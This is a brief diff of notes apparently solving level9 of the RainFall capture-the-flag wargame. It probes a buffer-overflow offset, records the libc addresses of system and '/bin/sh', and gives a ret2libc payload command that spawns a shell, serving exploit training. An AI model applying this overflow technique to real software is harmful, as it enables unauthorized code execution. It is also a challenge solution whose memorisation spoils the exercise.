@@ -1,0 +1,13 @@
+level9@RainFall:~$ ./level9 $(python -c 'print "A" * 108')
+
+level9@RainFall:~$ ./level9 $(python -c 'print "A" * 109')
+Segmentation fault (core dumped)
+
+
+Adresse /bin/sh : 0xb7ea7c58
+Adresse system : 0xb7d86060
+
+\x60\x60\xd8\xb7
+\x58\x7c\xea\xb7
+
+./level9 $(python -c 'print "A" * 108 + "\x60\x60\xd8\xb7" + "0000" + "\x58\x7c\xea\xb7"')
